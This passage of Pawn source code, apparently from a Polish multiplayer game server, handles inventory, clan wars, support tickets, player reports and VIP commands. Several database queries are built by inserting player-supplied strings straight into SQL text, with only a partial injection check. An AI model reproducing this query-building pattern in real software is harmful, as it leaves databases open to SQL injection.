	if(CompareEx(Player[playerid][ItemName1],"Brak"))
	{
	    format(Player[playerid][ItemName1], 256, "%s", item);
	    return Player[playerid][ItemAmount1] += amount;
	}
	if(CompareEx(Player[playerid][ItemName2],"Brak"))
	{
	    format(Player[playerid][ItemName2], 256, "%s", item);
	    return Player[playerid][ItemAmount2] += amount;
	}
	if(CompareEx(Player[playerid][ItemName3],"Brak"))
	{
	    format(Player[playerid][ItemName3], 256, "%s", item);
	    return Player[playerid][ItemAmount3] += amount;
	}
	if(CompareEx(Player[playerid][ItemName4],"Brak"))
	{
	    format(Player[playerid][ItemName4], 256, "%s", item);
	    return Player[playerid][ItemAmount4] += amount;
	}
	if(CompareEx(Player[playerid][ItemName5],"Brak"))
	{
	    format(Player[playerid][ItemName5], 256, "%s", item);
	    return Player[playerid][ItemAmount5] += amount;
	}
	if(CompareEx(Player[playerid][ItemName6],"Brak"))
	{
	    format(Player[playerid][ItemName6], 256, "%s", item);
	    return Player[playerid][ItemAmount6] += amount;
	}
	if(CompareEx(Player[playerid][ItemName7],"Brak"))
	{
	    format(Player[playerid][ItemName7], 256, "%s", item);
	    return Player[playerid][ItemAmount7] += amount;
	}
	if(CompareEx(Player[playerid][ItemName8],"Brak"))
	{
	    format(Player[playerid][ItemName8], 256, "%s", item);
	    return Player[playerid][ItemAmount8] += amount;
	}
	return 1;
}

CMD:eq(playerid, params[]) {
	new s[2048];
	format(s, sizeof(s), ""C_WHITE"%d{BCBCBC}x %s\n", Player[playerid][ItemAmount1], Player[playerid][ItemName1]);
	format(s, sizeof(s), "%s"C_WHITE"%d{BCBCBC}x %s\n", s, Player[playerid][ItemAmount2], Player[playerid][ItemName2]);
	format(s, sizeof(s), "%s"C_WHITE"%d{BCBCBC}x %s\n", s, Player[playerid][ItemAmount3], Player[playerid][ItemName3]);
	format(s, sizeof(s), "%s"C_WHITE"%d{BCBCBC}x %s\n", s, Player[playerid][ItemAmount4], Player[playerid][ItemName4]);
	format(s, sizeof(s), "%s"C_WHITE"%d{BCBCBC}x %s\n", s, Player[playerid][ItemAmount5], Player[playerid][ItemName5]);
	format(s, sizeof(s), "%s"C_WHITE"%d{BCBCBC}x %s\n", s, Player[playerid][ItemAmount6], Player[playerid][ItemName6]);
	format(s, sizeof(s), "%s"C_WHITE"%d{BCBCBC}x %s\n", s, Player[playerid][ItemAmount7], Player[playerid][ItemName7]);
	format(s, sizeof(s), "%s"C_WHITE"%d{BCBCBC}x %s\n"C_RED"Staraj siê nie zajmowaæ wszystkich slotów.\nMo¿e to spowodowaæ blokadê na otrzymywanie przedmiotów.", s, Player[playerid][ItemAmount8], Player[playerid][ItemName8]);
	return ShowPlayerDialog(playerid, DIALOG_EKWIPUNEK, DIALOG_STYLE_LIST, "{045DED}Ekwipunek", s, "Wybierz", "Zamknij"); }

CMD:skins(playerid, params[]) {
	new s[2048];
	if(sk[playerid][0]) format(s, sizeof(s), ""C_WHITE"["C_LOLIVE"+"C_WHITE"] Nó¿ | White {FF0000}Blood\n");
	else format(s, sizeof(s), ""C_WHITE"["C_RED"-"C_WHITE"] Nó¿ | White Blood\n");
	if(sk[playerid][1]) format(s, sizeof(s), "%s"C_WHITE"["C_LOLIVE"+"C_WHITE"] {2F538C}Nó¿ | Night Travel\n", s);
	else format(s, sizeof(s), "%s"C_WHITE"["C_RED"-"C_WHITE"] {2F538C}Nó¿ | Night Travel\n", s);
	format(s, sizeof(s), "%s"C_WHITE"Silencer\n", s);
	format(s, sizeof(s), "%s"C_WHITE"Desert Eagle\n", s);
	format(s, sizeof(s), "%s"C_WHITE"Shotgun\n", s);
	format(s, sizeof(s), "%s"C_WHITE"Combat Shotgun\n", s);
	format(s, sizeof(s), "%s"C_WHITE"MP5\n", s);
	format(s, sizeof(s), "%s"C_WHITE"M4\n", s);
	format(s, sizeof(s), "%s"C_WHITE"AK-47\n", s);
	format(s, sizeof(s), "%s"C_WHITE"Sniper Rifle\n", s);
	format(s, sizeof(s), "%s"C_RED"Zdejmij wszystkie skiny\n", s);
	return ShowPlayerDialog(playerid, DIALOG_SKINS, DIALOG_STYLE_LIST, ""C_BLUE1"Skiny do broni", s, "Wybierz", "Zamknij"); }


CMD:wojna(playerid, params[])
{
	if(isnull(params)) return SyntaxError(playerid, "{01FCFF}/wojna [gangid]");
	if(Player[playerid][Gang] == -1) return SendClientMessage(playerid, RED, "Nie jesteœ w ¿adnym klanie.");
	new gangid = Player[playerid][Gang];
	if(gLider1[gangid] != Player[playerid][ID] && gLider2[gangid] != Player[playerid][ID]) return SendClientMessage(playerid, RED, "Nie masz uprawnieñ do rozpoczêcia wojny klanów.");
	if(wojnatrwa) return SendClientMessage(playerid, RED, "Aktualnie trwa ju¿ inna wojna klanów.");
	if(!IsNumeric(params)) return SendClientMessage(playerid, RED, "B³êdne ID klanu.");
	new enemy = strval(params);
	if(gWar[enemy] != gangid) return SendClientMessage(playerid, RED, "Podany klan nie wyzywa³ Waszego klanu na wojnê.");
	if(gLider1[enemy] != Player[playerid][ID] && gLider2[enemy] != Player[playerid][ID]) return SendClientMessage(playerid, RED, "Podany klan nie wyzywa³ Waszego klanu na wojnê.");
	Loop(ganggid, MAX_GANGS) if(gWar[ganggid] == gangid) gWar[ganggid] = -1;
	wojnatrwa = true;
  	Loop(loopid, MAX_PLAYERS) Deffender[loopid] = false;
  	Loop(loopid, MAX_GANGS) WarScore[loopid] = 0;
  	deffenderid = Player[playerid][Gang];
  	attackerid = enemy;
	wattackers = 0;
 	wdeffenders = 0;
  	Loop(loopid, MAX_PLAYERS)
  	{
 		if(Player[loopid][Gang] == attackerid) {
 		    WypiszZabawa(loopid);
 		    OnGame[loopid] = -1;
		 	Attacker[loopid] = true;
		 	NaWojnie[loopid] = true; }
 		if(Player[loopid][Gang] == deffenderid) {
  		    WypiszZabawa(loopid);
 		    OnGame[loopid] = -1;
		 	Deffender[loopid] = true;
			NaWojnie[loopid] = true; }
	}
	Loop(loopid, MAX_PLAYERS) ClanWarT(loopid);
	warvehicle = CreateVehicle(470, gVehX[enemy], gVehY[enemy], gVehZ[enemy], gVehA[enemy], -1, -1, -1, 1);
	AddVehicleComponent(warvehicle, 1010);
	SetVehicleVirtualWorld(warvehicle, 69);
	GangZoneFlashForAll(gZone[deffenderid],RED);
	WarTimer = SetTimer("ClanWar", 2000, 1);
	new wojnastr[256];
	format(wojnastr, sizeof(wojnastr), ""PYTAJNIK""C_ORANGE"Wojna klanów {F44242}%s "C_ORANGE"vs {4292F4}%s "C_ORANGE"rozpoczêta!", gName[attackerid], gName[deffenderid]);
	SendClientMessageToAll(-1, wojnastr);
	GiveClanAchievement(attackerid, 3);
	GiveClanAchievement(deffenderid, 3);
	return 1;
}

forward ClanWarT(playerid);
public ClanWarT(playerid)
{
    if(!GetPlayerVirtualWorld(playerid) && NaWojnie[playerid])
    {
	    ResetPlayerWeapons(playerid);
		SetPlayerHealth(playerid, 100.0);
		SetPlayerArmour(playerid, 100.0);
	    if(Player[playerid][Gang] == attackerid)
	   	{
			OnGame[playerid] = -1;
			if(gColor[attackerid] == 0) SetPlayerColor(playerid, GREY);
			if(gColor[attackerid] == 1) SetPlayerColor(playerid, GREEN);
			if(gColor[attackerid] == 2) SetPlayerColor(playerid, RED);
			if(gColor[attackerid] == 3) SetPlayerColor(playerid, YELLOW);
			if(gColor[attackerid] == 4) SetPlayerColor(playerid, BLUE);
			if(gColor[attackerid] == 5) SetPlayerColor(playerid, ORANGE);
			if(gColor[attackerid] == 6) SetPlayerColor(playerid, MAGENTA);
			if(gColor[attackerid] == 7) SetPlayerColor(playerid, AQUA);
			if(gColor[attackerid] == 8) SetPlayerColor(playerid, GOLD);
			if(gColor[attackerid] == 9) SetPlayerColor(playerid, SEAGREEN);
			if(gColor[attackerid] == 10) SetPlayerColor(playerid, OLIVE);
			if(gColor[attackerid] == 11) SetPlayerColor(playerid, SPRINGGREEN);
			if(gColor[attackerid] == 12) SetPlayerColor(playerid, MAROON);
			if(gColor[attackerid] == 13) SetPlayerColor(playerid, LIME);
			if(gColor[attackerid] == 14) SetPlayerColor(playerid, MEDIUMAQUA);
			SetPlayerPos(playerid, gSpawnX[attackerid], gSpawnY[attackerid], gSpawnZ[attackerid]);
			SetPlayerVirtualWorld(playerid, 69);
			WarScore[attackerid] += 30;
	       	Attacker[playerid] = true;
			GivePlayerWeapon(playerid, 4, 1);
			GivePlayerWeapon(playerid, 24, 7999);
			GivePlayerWeapon(playerid, 25, 7999);
			GivePlayerWeapon(playerid, 31, 7999);
			GivePlayerWeapon(playerid, 34, 7999);
	       	return wattackers++;
	    }
	    if(Player[playerid][Gang] == deffenderid)
	    {
			OnGame[playerid] = -1;
			if(gColor[deffenderid] == 0) SetPlayerColor(playerid, GREY);
			if(gColor[deffenderid] == 1) SetPlayerColor(playerid, GREEN);
			if(gColor[deffenderid] == 2) SetPlayerColor(playerid, RED);
			if(gColor[deffenderid] == 3) SetPlayerColor(playerid, YELLOW);
			if(gColor[deffenderid] == 4) SetPlayerColor(playerid, BLUE);
			if(gColor[deffenderid] == 5) SetPlayerColor(playerid, ORANGE);
			if(gColor[deffenderid] == 6) SetPlayerColor(playerid, MAGENTA);
			if(gColor[deffenderid] == 7) SetPlayerColor(playerid, AQUA);
			if(gColor[deffenderid] == 8) SetPlayerColor(playerid, GOLD);
			if(gColor[deffenderid] == 9) SetPlayerColor(playerid, SEAGREEN);
			if(gColor[deffenderid] == 10) SetPlayerColor(playerid, OLIVE);
			if(gColor[deffenderid] == 11) SetPlayerColor(playerid, SPRINGGREEN);
			if(gColor[deffenderid] == 12) SetPlayerColor(playerid, MAROON);
			if(gColor[deffenderid] == 13) SetPlayerColor(playerid, LIME);
			if(gColor[deffenderid] == 14) SetPlayerColor(playerid, MEDIUMAQUA);
			SetPlayerPos(playerid, gSpawnX[deffenderid], gSpawnY[deffenderid], gSpawnZ[deffenderid]);
			SetPlayerVirtualWorld(playerid, 69);
	        Deffender[playerid] = true;
	        WarScore[deffenderid] += 30;
			GivePlayerWeapon(playerid, 4, 1);
			GivePlayerWeapon(playerid, 24, 7999);
			GivePlayerWeapon(playerid, 25, 7999);
			GivePlayerWeapon(playerid, 31, 7999);
			GivePlayerWeapon(playerid, 34, 7999);
   			wdeffenders++;
	        return SetPlayerVirtualWorld(playerid, 69);
		}
	}
	return 1;
}

forward ClanWar();
public ClanWar()
{
	if(!wojnatrwa) return 1;
	new winstr[256];
	Loop(playerid, MAX_PLAYERS)
	{
	    new gang = Player[playerid][Gang];
		if(!IsPlayerInArea(playerid, gMinX[gang], gMinY[gang], gMaxX[gang], gMaxY[gang]) && Deffender[playerid])
		{
		    new Float:health;
		    GetPlayerHealth(playerid, health);
		    SendClientMessage(playerid, RED, "Nie opuszczaj strefy Twojego klanu!");
		    SetPlayerPos(playerid, gSpawnX[gang], gSpawnY[gang], gSpawnZ[gang]);
		    SetPlayerHealth(playerid, health - 10);
		}
	}
	if(wdeffenders == 0)
	{
 		KillTimer(WarTimer);
 		wojnatrwa = false;
		gScore[attackerid] += WarScore[deffenderid];
		gWar[attackerid] = -1;
		gWar[deffenderid] = -1;
		format(winstr, sizeof(winstr), ""PYTAJNIK""C_ORANGE"Wojnê klanów wygrywaj¹ "C_WHITE"%s"C_ORANGE"!", gName[attackerid]);
		SendClientMessageToAll(-1, winstr);
 		GangZoneStopFlashForAll(gZone[deffenderid]);
		attackerid = -1;
		deffenderid = -1;
		Loop(playerid, MAX_PLAYERS)
		{
			if(NaWojnie[playerid])
			{
				Attacker[playerid] = false;
				Deffender[playerid] = false;
				NaWojnie[playerid] = false;
 				SetPlayerVirtualWorld(playerid, 0);
				ResetPlayerWeapons(playerid);
				SpawnFunction(playerid);
			}
		}
		DestroyVehicle(warvehicle);
	}
	if(wattackers == 0)
	{
		KillTimer(WarTimer);
		wojnatrwa = false;
		gScore[deffenderid] += WarScore[attackerid];
		gWar[attackerid] = -1;
		gWar[deffenderid] = -1;
		format(winstr, sizeof(winstr), ""PYTAJNIK""C_ORANGE"Wojnê klanów wygrywaj¹ "C_WHITE"%s"C_ORANGE"!", gName[deffenderid]);
		SendClientMessageToAll(-1, winstr);
 		GangZoneStopFlashForAll(gZone[deffenderid]);
		attackerid = -1;
		deffenderid = -1;
		Loop(playerid, MAX_PLAYERS)
		{
			if(NaWojnie[playerid])
			{
				Attacker[playerid] = false;
				Deffender[playerid] = false;
				NaWojnie[playerid] = false;
 				SetPlayerVirtualWorld(playerid, 0);
				ResetPlayerWeapons(playerid);
				SpawnFunction(playerid);
			}
		}
		DestroyVehicle(warvehicle);
	}
	return 1;
}

CMD:helpdesk(playerid, params[]) return cmd_support(playerid, params);
CMD:support(playerid, params[])
{
	new sql[2048], ticketid = -1, subject[256], status, s[2048], uid;
	if(Player[playerid][Admin] == 4)
	{
		m_query("SELECT ticket, subject, suid FROM support WHERE status = 0 ORDER BY ticket ASC");
		mysql_store_result();
		new tickety = mysql_num_rows();
		if(tickety == 0) return DialogError(playerid, "{FFFF00}Brak wiadomoœci, na których nie udzielono odpowiedzi.");
		while(mysql_fetch_row(sql))
		{
			sscanf(sql, "p<|>is[1024]", ticketid, sql);
			sscanf(sql, "p<|>s[256]i", subject, uid);
			format(s, sizeof(s), "%s"C_WHITE"%d. %s (UID %d)\n", s, ticketid, subject, uid);
		}
		mysql_free_result();
		return ShowPlayerDialog(playerid, DIALOG_SUPPORTSELA, DIALOG_STYLE_LIST, ""C_BLUE1"Support - Nieprzeczytane", s, "Wybierz", "Zamknij");
	}
	m_query("SELECT * FROM support WHERE suid = %d && status < 2", Player[playerid][ID]);
	mysql_store_result();
	new tickety = mysql_num_rows();
	mysql_free_result();
	if(tickety > 0)
	{
		m_query("SELECT ticket, subject, status FROM support WHERE suid = %d ORDER BY ticket ASC", Player[playerid][ID]);
		mysql_store_result();
		while(mysql_fetch_row(sql))
		{
			sscanf(sql, "p<|>is[1024]", ticketid, sql);
			sscanf(sql, "p<|>s[256]i", subject, status);
			if(status == 0) format(s, sizeof(s), "%s"C_WHITE"%d. %s - "C_RED"Oczekuje na odpowiedŸ\n", s, ticketid, subject);
			if(status == 1) format(s, sizeof(s), "%s"C_WHITE"%d. %s - "C_GREEN"Udzielono odpowiedzi\n", s, ticketid, subject);
		}
		mysql_free_result();
		return ShowPlayerDialog(playerid, DIALOG_SUPPORTSEL, DIALOG_STYLE_LIST, ""C_BLUE1"Support", s, "Wybierz", "Zamknij");
	}
	else return ShowPlayerDialog(playerid, DIALOG_SUPPORTSEND, DIALOG_STYLE_INPUT, ""C_BLUE1"Support - Nowy temat", ""C_BLUE1"W tym miejscu mo¿esz napisaæ nowy temat do zarz¹du serwera.\nPamiêtaj, aby u¿ywaæ tego panelu tylko w sprawach technicznych.\n\n"C_RED"WprowadŸ poni¿ej nazwê tematu.", "Dalej", "Zamknij");
}

CMD:r(playerid, params[]) return cmd_raport(playerid, params);
CMD:report(playerid, params[]) return cmd_raport(playerid, params);
CMD:cheater(playerid, params[]) return cmd_raport(playerid, params);
CMD:raport(playerid, params[])
{
   	if(GetPVarInt(playerid,"Raport") > gettime()) return DialogError(playerid, "{FFFF00}Ostatnio raportowa³eœ ju¿ jakiegoœ gracza.");
	new giveid, reason[32];
	if(sscanf(params,"is[32]",giveid, reason)) return SyntaxError(playerid, "{01FCFF}/raport [playerid] [powód]");
    if(SQLInjection(reason))
    {
		if(pAch[playerid][1] < 1) {
			pAch[playerid][1] = 1;
			AddExp(playerid, 200);
			Sound(playerid,1137,0.0,0.0,0.0);
			SendClientMessageEx(playerid, -1, "Nowe osi¹gniêcie: "C_NICK"Haker", "New achievement: "C_NICK"Haker"); }
		return 1;
    }
	if(!IsPlayerConnected(giveid) || !Player[giveid][IsLoggedIn]) return SendClientMessage(playerid, RED, "Gracz o podanym ID nie jest po³¹czony.");
//	if(giveid == playerid) return SendClientMessage(playerid, RED, "Podane ID jest nieprawid³owe.");
   	SetPVarInt(playerid,"Raport",gettime()+45);
	m_query("INSERT INTO raporty (reportedid, reportingname, reason, time) VALUES (%d, '%s', '%s', %d)", giveid, Player[playerid][Name], reason, gettime());
   	new msgs[256];
	format(msgs, sizeof(msgs), "{565656}[raport] "C_WHITE"%s(%d) zg³asza %s(%d) za: {FF0000}%s {828282}({FF0000}/raporty{828282})", Player[playerid][Name], playerid, Player[giveid][Name], giveid, reason);
 	Loop(loopid, MAX_PLAYERS) {
	 	if(Player[loopid][Admin] > 0) {
	 	    PlayerPlaySound(loopid, 5201, 0.0, 0.0, 0.0);
		 	SendClientMessage(loopid, WHITE, msgs); } }
 	new msg[256];
	format(msg, sizeof(msg), "[%02d:%02d:%02d] Nowy raport!", hour, minute, second);
   	DCC_SendChannelMessage(samp_admin, msg);
   	format(msg, sizeof(msg), "Od: (%d) %s", playerid, Player[playerid][Name]);
   	DCC_SendChannelMessage(samp_admin, msg);
   	format(msg, sizeof(msg), "Na: (%d) %s", giveid, Player[giveid][Name]);
   	DCC_SendChannelMessage(samp_admin, msg);
	format(msg, sizeof(msg), "%s", reason);
	DCC_SendChannelMessage(samp_admin, msg);
	return SendClientMessage(playerid, -1, ""PLUS""C_LOLIVE"Gracz zosta³ zg³oszony.");
}

CMD:rr(playerid, params[])
{
    if(Player[playerid][Admin] < 1) return SendClientMessage(playerid, RED, "Nie posiadasz rangi "JUNIOR""C_RED" lub wy¿szej.");
	new giveid, reason[32];
	if(sscanf(params,"is[32]",giveid, reason)) return SyntaxError(playerid, "{01FCFF}/rr [playerid] [odpowiedŸ]");
	m_query("SELECT * FROM raporty WHERE reportedid = %d", giveid);
	mysql_store_result();
	new tickety = mysql_num_rows();
	mysql_free_result();
	if(tickety > 0)
	{
		m_query("DELETE FROM raporty WHERE reportedid = %d", giveid);
		new msgstr[256];
		format(msgstr, sizeof(msgstr), "{565656}[raport] "C_WHITE"%s(%d){565656}: {FF0000}%s", Player[giveid][Name], giveid, reason);
		SendClientMessageToAll(-1, msgstr);
	}
	if(pAch[giveid][3] < 1) {
		pAch[giveid][3] = 1;
		AddExp(giveid, 200);
		Sound(giveid,1137,0.0,0.0,0.0);
		return SendClientMessageEx(giveid, -1, "Nowe osi¹gniêcie: "C_NICK"Cheater", "New achievement: "C_NICK"Cheater"); }
	else return SendClientMessage(playerid, RED, "Na tego gracza nie ma obecnie raportu.");
}

CMD:raporty(playerid, params[])
{
    if(Player[playerid][Admin] < 1) return SendClientMessage(playerid, RED, "Nie posiadasz rangi "JUNIOR""C_RED" lub wy¿szej.");
	new sql[1024], s[1024];
	m_query("SELECT * FROM raporty");
	mysql_store_result();
	new tickety = mysql_num_rows();
	mysql_free_result();
	new reportedid, reportingname[20], reason[32];
	if(tickety > 0)
	{
		m_query("SELECT reportedid, reportingname, reason FROM raporty ORDER BY time DESC LIMIT 8", Player[playerid][ID]);
		mysql_store_result();
		while(mysql_fetch_row(sql))
		{
			sscanf(sql, "p<|>s[1024]", sql);
			sscanf(sql, "p<|>is[20]s[32]", reportedid, reportingname, reason);
			format(s, sizeof(s), "%s"C_WHITE"ID {FF0000}%d "C_WHITE"- {FF0000}%s "C_WHITE"(Od %s)\n", s, reportedid, reason, reportingname);
		}
		mysql_free_result();
		return ShowPlayerDialog(playerid, DIALOG_UNUSED, DIALOG_STYLE_LIST, "{FF0000}Raporty", s, "Zamknij", "");
	}
	return 1;
}

CMD:busted(playerid, params[])
{
    if(Player[playerid][Admin] < 1) return SendClientMessage(playerid, RED, "Nie posiadasz rangi "JUNIOR""C_RED" lub wy¿szej.");
	if(!BustedMode[playerid]) {
	    SendClientMessage(playerid, -1, ""PLUS""C_LOLIVE"Tryb nagrywania Busted w³¹czony.");
	    return BustedMode[playerid] = true; }
	else {
	    SendClientMessage(playerid, -1, ""PLUS""C_LOLIVE"Tryb nagrywania Busted wy³¹czony.");
	    BustedMode[playerid] = false;
		return 1; }
}

CMD:ccheats(playerid, params[])
{
    if(Player[playerid][Admin] < 1) return SendClientMessage(playerid, RED, "Nie posiadasz rangi "JUNIOR""C_RED" lub wy¿szej.");
	new giveid;
	if(sscanf(params,"i",giveid)) return SyntaxError(playerid, "{01FCFF}/ccheats [playerid]");
	if(!IsPlayerConnected(giveid)) return SendClientMessage(playerid, RED, "Podano b³êdne ID gracza.");
	if(Opcja[giveid] < 1) return SendClientMessage(playerid, RED, ""C_RED"Ten gracz nie posiada w³¹czonych cheatów z "C_WHITE"/cheats"C_RED".");
	else return SendClientMessage(playerid, -1, ""PLUS""C_LOLIVE"Ten gracz posiada w³¹czone cheaty z "C_WHITE"/cheats"C_LOLIVE".");
}

CMD:cobj(playerid, params[])
{
    if(Player[playerid][Admin] < 1) return SendClientMessage(playerid, RED, "Nie posiadasz rangi "JUNIOR""C_RED" lub wy¿szej.");
	new giveid;
	if(sscanf(params,"i",giveid)) return SyntaxError(playerid, "{01FCFF}/cobj [playerid]");
	if(!IsPlayerConnected(giveid)) return SendClientMessage(playerid, RED, "Podano b³êdne ID gracza.");
	if(GetPVarInt(playerid, "player_objected")) return SendClientMessage(playerid, RED, ""C_RED"Ten gracz nie posiada w³¹czonej widocznoœci obiektów.");
	else return SendClientMessage(playerid, -1, ""PLUS""C_LOLIVE"Ten gracz posiada w³¹czon¹ widocznoœæ obiektów.");
}

CMD:jetpack(playerid, params[]) {
   	if(Player[playerid][Admin] < 1) return SendClientMessage(playerid, RED, "Nie posiadasz rangi "JUNIOR""C_RED" lub wy¿szej.");
	SetPlayerSpecialAction(playerid,SPECIAL_ACTION_USEJETPACK);
	return 1; }

CMD:ufo(playerid, params[])
{
    if(Player[playerid][Vip] < gettime()) return SendClientMessage(playerid, RED, "Ta komenda jest dostêpna dla "C_YELLOW"VIPa"C_RED".");
    new type;
    if(isnull(params))
    {
        if(GetPVarInt(playerid, "UsedUFO") != 0) {
			ResetUFO(playerid);
			return SendClientMessage(playerid, -1, ""PLUS""C_LOLIVE"UFO wy³¹czone."); }
    }
    if(sscanf(params, "i", type)) return SyntaxError(playerid, "{01FCFF}/ufo [1,2]");
    if(type == 1)
    {
        if(GetPVarInt(playerid, "UsedUFO") != 0) return DialogError(playerid, "{FFFF00}Posiadasz aktywne UFO. Zdejmij je za pomoc¹ "C_WHITE"/ufo{FFFF00}.");
		SetPlayerAttachedObject(playerid,4,3515,1,-0.609999,0.000000,-0.003999,0.000000,90.900000,0.000000,0.832001,0.818000,0.553001);
		SetPlayerAttachedObject(playerid,5,18843,1,-0.712000,0.000000,0.000000,0.000000,0.000000,0.000000,0.014000,0.015000,0.016000);
		SetPlayerAttachedObject(playerid,6,3515,1,0.133001,-0.011000,0.017000,0.000000,-90.000000,0.000000,0.818000,0.772001,0.359001);
		SetPlayerAttachedObject(playerid,7,18843,1,0.074999,-0.017000,0.026999,0.000000,0.000000,0.000000,0.019000,0.020000,0.020000);
		SetPlayerSpecialAction(playerid,SPECIAL_ACTION_USEJETPACK);
		SetPVarInt(playerid, "UsedUFO", 1);

		switch(random(3))
		{
			case 0:SetPlayerAttachedObject(playerid,8,18656,1,0.918999,-0.342001,-0.760999,-12.000008,0.000000,90.000,1.000000,1.000000,1.000000);
			case 1:SetPlayerAttachedObject(playerid,8,18657,1,0.918999,-0.342001,-0.760999,-12.000008,0.000000,90.000,1.000000,1.000000,1.000000);
			case 2:SetPlayerAttachedObject(playerid,8,18658,1,0.918999,-0.342001,-0.760999,-12.000008,0.000000,90.000,1.000000,1.000000,1.000000);
		}
		return SendClientMessage(playerid, -1, ""PLUS""C_LOLIVE"UFO w³¹czone.");
	}
	if(type == 2)
	{
        if(GetPVarInt(playerid, "UsedUFO") != 0) return DialogError(playerid, "{FFFF00}Posiadasz aktywne UFO. Zdejmij je za pomoc¹ "C_WHITE"/ufo{FFFF00}.");
		SetPlayerAttachedObject(playerid,5,3515,1,1.281999,-1.577000,-0.281000,-0.499999,90.800125,-0.599996,4.183998,4.936002,2.922001);
		SetPlayerAttachedObject(playerid,6,3515,1,5.023988,-1.466000,-0.072000,0.199999,-89.300010,8.799994,4.148001,4.529000,1.617000);
		SetPlayerAttachedObject(playerid,7,18843,1,4.163002,-1.490000,0.000000,0.000000,0.000000,0.000000,0.089000,0.117999,0.099000);
		SetPlayerSpecialAction(playerid,SPECIAL_ACTION_USEJETPACK);
		switch(random(3))
		{
			case 0:SetPlayerAttachedObject(playerid,8,18656,1,5.162999,-0.976000,-4.204011,0.000000,-2.100000,106.999916,4.111006,2.611997,5.209000);
			case 1:SetPlayerAttachedObject(playerid,8,18657,1,5.162999,-0.976000,-4.204011,0.000000,-2.100000,106.999916,4.111006,2.611997,5.209000);
			case 2:SetPlayerAttachedObject(playerid,8,18658,1,5.162999,-0.976000,-4.204011,0.000000,-2.100000,106.999916,4.111006,2.611997,5.209000);
		}
		SetPVarInt(playerid, "UsedUFO", 1);
	}
	return 1;
}

CMD:cheats(playerid, params[])
{
    if(Player[playerid][Vip] < gettime()) return SendClientMessage(playerid, RED, "Ta komenda jest dostêpna dla "C_YELLOW"VIPa"C_RED".");
	new cheatstr[1024];
	format(cheatstr, sizeof(cheatstr), ""C_WHITE"1.\t"C_BLUE1"Podskok\n"C_WHITE"2.\t"C_BLUE1"Turbo\n"C_WHITE"3.\t"C_BLUE1"Stopniowe zwalnianie\n"C_WHITE"4.\t"C_BLUE1"Natychmiastowy stop\n"C_WHITE"5.\t"C_BLUE1"Obrót o 180 stopni\n"C_WHITE"6.\t"C_BLUE1"Obrót o 90 stopni\n"C_WHITE"7.\t"C_BLUE1"Natychmiastowa zmiana koloru\n");
	format(cheatstr, sizeof(cheatstr), "%s"C_WHITE"8.\t"C_BLUE1"Przyspieszenie w przód\n"C_WHITE"9.\t"C_BLUE1"Przyspieszenie w ty³\n"C_WHITE"10.\t"C_BLUE1"Auto Flip\n"C_WHITE"11.\t"C_BLUE1"Podwójny skok\n"C_RED"Wy³¹cz", cheatstr);
	return ShowPlayerDialog(playerid, DIALOG_CHEATS, DIALOG_STYLE_LIST, ""C_BLUE1"Cheaty dla "C_YELLOW"VIPa", cheatstr, "Wybierz", "Zamknij");
}

CMD:laser(playerid, params[])
{
    if(Player[playerid][Vip] < gettime()) return SendClientMessage(playerid, RED, "Ta komenda jest dostêpna dla "C_YELLOW"VIPa"C_RED".");
	new cheatstr[1024];
	format(cheatstr, sizeof(cheatstr), ""C_BLUE1"Zarz¹dzanie widocznoœci¹ lasera\n{FF0400}Czerwony\n{007BFF}Niebieski\n{FF00CB}Ró¿owy\n{ff9933}Pomarañczowy\n{43FF00}Zielony\n{ffff00}¯ó³ty");
	return ShowPlayerDialog(playerid, DIALOG_LASER, DIALOG_STYLE_LIST, ""C_BLUE1"Lasery do broni dla "C_YELLOW"VIPa", cheatstr, "Wybierz", "Zamknij");
}

CMD:klan(playerid, params[]) return cmd_clan(playerid, params);
CMD:clan(playerid, params[])
{
	if(Player[playerid][Gang] == -1) return DialogError(playerid, "{FFFF00}Nie przebywasz w ¿adnym klanie.");
	new gangid = Player[playerid][Gang], s[128];
	format(s, sizeof(s), ""C_WHITE"Teleportuj do punktu startowego\n");
	format(s, sizeof(s), "%s{FFFF00}Odznaczenia klanowe\n", s);
	format(s, sizeof(s), "%s"C_WHITE"Opuœæ klan\n", s);
	if(gLider1[gangid] == Player[playerid][ID] || gLider2[gangid] == Player[playerid][ID])
	{
		format(s, sizeof(s), "%s"C_RED"Zarz¹dzaj klanem", s);
	}
	return ShowPlayerDialog(playerid, DIALOG_KLAN, DIALOG_STYLE_LIST, ""C_BLUE1"Twój klan", s, "Wybierz", "Zamknij");
}

CMD:clans(playerid, params[]) return cmd_klany(playerid, params);
CMD:klany(playerid, params[])
{
	new s[2048];
	Loop(ganggid, MAX_GANGS)
	{
		m_query("SELECT uid FROM clans WHERE uid = %d", ganggid);
		mysql_store_result();
		if(mysql_num_rows() > 0)
		{
		    new osia = 0;
		    Loop(gach, 8) { if(gAch[ganggid][gach]) osia++; }
			if(gColor[ganggid] == 0) {
				if(osia == 0) format(s, sizeof(s), "%s"C_WHITE"%d. {%06x}%s "C_WHITE"(Respekt: %d)\n", s, ganggid, GREY >>> 8, gName[ganggid], gScore[ganggid]);
				else format(s, sizeof(s), "%s"C_WHITE"%d. {%06x}%s "C_WHITE"(Respekt: %d) {FFFF00}(Odznaczenia: %d)"C_WHITE"\n", s, ganggid, GREY >>> 8, gName[ganggid], gScore[ganggid], osia); }
			if(gColor[ganggid] == 1) {
				if(osia == 0) format(s, sizeof(s), "%s"C_WHITE"%d. {%06x}%s "C_WHITE"(Respekt: %d)\n", s, ganggid, GREEN >>> 8, gName[ganggid], gScore[ganggid]);
				else format(s, sizeof(s), "%s"C_WHITE"%d. {%06x}%s "C_WHITE"(Respekt: %d) {FFFF00}(Odznaczenia: %d)"C_WHITE"\n", s, ganggid, GREEN >>> 8, gName[ganggid], gScore[ganggid], osia); }
			if(gColor[ganggid] == 2) {
				if(osia == 0) format(s, sizeof(s), "%s"C_WHITE"%d. {%06x}%s "C_WHITE"(Respekt: %d)\n", s, ganggid, RED >>> 8, gName[ganggid], gScore[ganggid]);
				else format(s, sizeof(s), "%s"C_WHITE"%d. {%06x}%s "C_WHITE"(Respekt: %d) {FFFF00}(Odznaczenia: %d)"C_WHITE"\n", s, ganggid, RED >>> 8, gName[ganggid], gScore[ganggid], osia); }
			if(gColor[ganggid] == 3) {
				if(osia == 0) format(s, sizeof(s), "%s"C_WHITE"%d. {%06x}%s "C_WHITE"(Respekt: %d)\n", s, ganggid, YELLOW >>> 8, gName[ganggid], gScore[ganggid]);
				else format(s, sizeof(s), "%s"C_WHITE"%d. {%06x}%s "C_WHITE"(Respekt: %d) {FFFF00}(Odznaczenia: %d)"C_WHITE"\n", s, ganggid, YELLOW >>> 8, gName[ganggid], gScore[ganggid], osia); }
